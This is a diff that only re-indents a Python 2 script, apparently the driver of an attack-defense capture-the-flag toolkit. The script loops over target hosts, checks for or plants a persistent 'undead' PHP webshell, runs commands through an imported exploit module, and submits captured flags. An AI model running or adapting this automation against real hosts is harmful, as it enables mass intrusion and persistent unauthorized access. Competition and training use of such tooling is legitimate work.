@@ -14,10 +14,10 @@ from optparse import OptionParser
 
 def test_attack(target,target_port):
     try:
-	if 'hell0W0r1d' in vulnerable_attack(target,target_port,test_vul(target,target_port,cmd)):
-	    return True
+        if 'hell0W0r1d' in vulnerable_attack(target,target_port,test_vul(target,target_port,cmd)):
+            return True
     except Exception,e:
-	pass
+        pass
     return False
 
 def attack(target,target_port,cmd,get_flag):
@@ -30,59 +30,59 @@ def attack(target,target_port,cmd,get_flag):
     info = "success"
     reserve = 0    
     if options.random_ua:
-	headers['User-Agent'] = random_ua()    
+        headers['User-Agent'] = random_ua()    
     is_shell = check_shell(target,target_port,"")
     if is_shell=='timeout':
-	shell_name,shell_arg = shell_hash(target,target_port)
-	# Sometime the timeout is result from we are generating an undead webshell
-	if shell_name in cmd and shell_type==2 and test_attack(target,target_port):
-	    dump_warning("Writting undead php webshell")
-	    res = "timeout due to write undead webshell"
-	else:
-	    dump_error("connect timeout",target+":"+str(target_port),"function.py check_shell")
-	    write_specific_log(target,target_port,"[-] connect timeout")
-	    is_alive = 0
-	    res = "timeout"
+        shell_name,shell_arg = shell_hash(target,target_port)
+        # Sometime the timeout is result from we are generating an undead webshell
+        if shell_name in cmd and shell_type==2 and test_attack(target,target_port):
+            dump_warning("Writting undead php webshell")
+            res = "timeout due to write undead webshell"
+        else:
+            dump_error("connect timeout",target+":"+str(target_port),"function.py check_shell")
+            write_specific_log(target,target_port,"[-] connect timeout")
+            is_alive = 0
+            res = "timeout"
     elif is_shell:
-	dump_success("check_shell success",target+":"+str(target_port),"function.py check_shell")
-	write_specific_log(target,target_port,"[+] check shell success")
-	res = execute_shell(target,target_port,cmd)
+        dump_success("check_shell success",target+":"+str(target_port),"function.py check_shell")
+        write_specific_log(target,target_port,"[+] check shell success")
+        res = execute_shell(target,target_port,cmd)
     else:
-	dump_warning("check_shell failed",target+":"+str(target_port),"function.py check_shell")
-	write_specific_log(target,target_port,"[-] check shell fail")
-	# Here we use the vulnerability we found in the source code
-	res = vulnerable_attack(target,target_port,cmd)
+        dump_warning("check_shell failed",target+":"+str(target_port),"function.py check_shell")
+        write_specific_log(target,target_port,"[-] check shell fail")
+        # Here we use the vulnerability we found in the source code
+        res = vulnerable_attack(target,target_port,cmd)
     debug_print(res)
     res = res_filter(res)
     if get_flag:
-	if check_flag(res):
-	    flag = res
-	    is_flag = 1
-	    dump_info("flag => " + res.replace(" ","").replace("\n",""))
-	else:
+        if check_flag(res):
+            flag = res
+            is_flag = 1
+            dump_info("flag => " + res.replace(" ","").replace("\n",""))
+        else:
             is_vuln = 0
-	    dump_warning("flag format error,you may need to rewrite the shell", target+":"+str(target_port) ,"run.py attack")
-	    write_specific_log(target,target_port,"[-] flag format wrong")
+            dump_warning("flag format error,you may need to rewrite the shell", target+":"+str(target_port) ,"run.py attack")
+            write_specific_log(target,target_port,"[-] flag format wrong")
     elif "error" in res:
-	dump_warning("execution cmd failed",target+":"+str(target_port),"run.py")
-	is_vuln = 0
-	write_specific_log(target,target_port,"[-] execute cmd fail")
+        dump_warning("execution cmd failed",target+":"+str(target_port),"run.py")
+        is_vuln = 0
+        write_specific_log(target,target_port,"[-] execute cmd fail")
     else:
-	dump_success("execution cmd",target+":"+str(target_port),"run.py")
-	write_specific_log(target,target_port,"[+] execute cmd success")
+        dump_success("execution cmd",target+":"+str(target_port),"run.py")
+        write_specific_log(target,target_port,"[+] execute cmd success")
     dump_context(res)
     
     now_status =  (target + ":" + target_port).ljust(32," ")
     if is_alive:
-	now_status += "|alive|"
-	if is_vuln:
-	    now_status += "|vuln|"
-	if is_shell:
-	    now_status += "|shell|"
-	if is_flag:
-	    now_status += "|flag|"
+        now_status += "|alive|"
+        if is_vuln:
+            now_status += "|vuln|"
+        if is_shell:
+            now_status += "|shell|"
+        if is_flag:
+            now_status += "|flag|"
     else:
-	now_status += '|timeout|'
+        now_status += '|timeout|'
     now_status += '\n'
     targets_status += now_status 
     return flag,is_vuln,info,reserve 
@@ -94,62 +94,62 @@ def run():
     
     # if the target list exsists, load it. or regard it as ip addr
     if udf_target:
-	targets = udf_target.split(',')
+        targets = udf_target.split(',')
     elif os.path.isfile(target_list):
-	targets = open(target_list).readlines()
+        targets = open(target_list).readlines()
 
     for target in targets:
-	target = target.strip('\n')
+        target = target.strip('\n')
         target,target_port = target.split(":")
-	reserve = 0
-	is_vuln = 1
-	info = "error"
-	flag = "hello world!"
+        reserve = 0
+        is_vuln = 1
+        info = "error"
+        flag = "hello world!"
 
-	try:
-	    # Save the raw cmd
-	    if first_run:
-		raw_cmd = cmd
+        try:
+            # Save the raw cmd
+            if first_run:
+                raw_cmd = cmd
                 first_run = 0
-	    dump_success("start attack %s with %s "%(target+":"+target_port,raw_cmd))
-	    # Use the func in function.py to translate the cmd to real cmd
-	    if func:
-		cmd = cmd_split_prefix + func(target,target_port,"") + cmd_split_postfix
+            dump_success("start attack %s with %s "%(target+":"+target_port,raw_cmd))
+            # Use the func in function.py to translate the cmd to real cmd
+            if func:
+                cmd = cmd_split_prefix + func(target,target_port,"") + cmd_split_postfix
             else:
                 cmd = cmd_split_prefix + raw_cmd + cmd_split_postfix
-	    debug_print(cmd)
+            debug_print(cmd)
             flag,is_vuln,info,reserve = attack(target,target_port,cmd,run_for_flag)
-	    
-	    # Try to visit the undead shell after it generates
-	    if shell_type == 2 and raw_cmd == 'get_shell':
+            
+            # Try to visit the undead shell after it generates
+            if shell_type == 2 and raw_cmd == 'get_shell':
                 dump_info("Visting the undead shell...")
-		visit_shell(target,target_port,'')
+                visit_shell(target,target_port,'')
 
-	except Exception,e:
-	    debug_print(traceback.format_exc())
-	    dump_error(str(e),target,"run.py")
-	
-	#set the return value reverse => 0 and is_vuln => 1 and the flag has  been changed, post the flag.
-	if not reserve and  is_vuln and flag!="hello world!":
-	    res = post_flag(flag)
-	    if res:
-		dump_success("get flag success",target+":"+str(target_port),"run.py")
-		write_specific_log(target,target_port,"[+] get flag success")
-	    else:
-		# flag server check error may result from the duplicate submission of the flag 
-		dump_warning("flag server check error",target+":"+str(target_port),"run.py")
-		write_specific_log(target,target_port,"[-] flag server check error")
-	elif is_vuln == 0:
-	    dump_error("server is not vulnerable",target+":"+str(target_port),"run.py")
-	    write_specific_log(target,target_port,"[-] server is not vulnerable to current payload")
-	elif reserve==1:
-	    dump_error("reverse flag has been set",target+":"+str(target_port),"run.py")
-	    write_specific_log(target,target_port,"[-] reverse flag has been set")
-	dump_success("finish attack %s with %s"%(target+":"+target_port,raw_cmd))
-	print ""
-	print ""
-	print ""
-		 
+        except Exception,e:
+            debug_print(traceback.format_exc())
+            dump_error(str(e),target,"run.py")
+        
+        #set the return value reverse => 0 and is_vuln => 1 and the flag has  been changed, post the flag.
+        if not reserve and  is_vuln and flag!="hello world!":
+            res = post_flag(flag)
+            if res:
+                dump_success("get flag success",target+":"+str(target_port),"run.py")
+                write_specific_log(target,target_port,"[+] get flag success")
+            else:
+                # flag server check error may result from the duplicate submission of the flag 
+                dump_warning("flag server check error",target+":"+str(target_port),"run.py")
+                write_specific_log(target,target_port,"[-] flag server check error")
+        elif is_vuln == 0:
+            dump_error("server is not vulnerable",target+":"+str(target_port),"run.py")
+            write_specific_log(target,target_port,"[-] server is not vulnerable to current payload")
+        elif reserve==1:
+            dump_error("reverse flag has been set",target+":"+str(target_port),"run.py")
+            write_specific_log(target,target_port,"[-] reverse flag has been set")
+        dump_success("finish attack %s with %s"%(target+":"+target_port,raw_cmd))
+        print ""
+        print ""
+        print ""
+                 
 def banner():
     my_banner = ""
     my_banner += "    ___        ______    ___       _       _ \n"
@@ -191,9 +191,9 @@ if __name__ == '__main__':
     loop_count = int(options.loop_count)
     udf_target = options.udf_target
     if options.random_ua:
-	dump_info("enable feature random user-agent")
+        dump_info("enable feature random user-agent")
     if cmd=="get_flag" or cmd=="get_flag_2":
-	run_for_flag = 1
+        run_for_flag = 1
     vulnerable_attack = importlib.import_module('samples.' + load_script).vulnerable_attack
 
 # if the attack fails, the possible reasons are:
@@ -208,15 +208,15 @@ if __name__ == '__main__':
 
     while loop_count > 0:
         try:
-	    run()
-	    record_status(targets_status)
-	    targets_status = ''
-	    dump_info("sleeping ...")
-	    time.sleep(script_runtime_span)
+            run()
+            record_status(targets_status)
+            targets_status = ''
+            dump_info("sleeping ...")
+            time.sleep(script_runtime_span)
         except  KeyboardInterrupt:
-	    dump_error("Program stoped by user, existing...")
-	    exit()
+            dump_error("Program stoped by user, existing...")
+            exit()
         dump_info("---------------------------- one round finish -----------------------------")
-	print ""
-	loop_count -= 1
+        print ""
+        loop_count -= 1
     dump_info("finish all tasks, have a nice day :)")
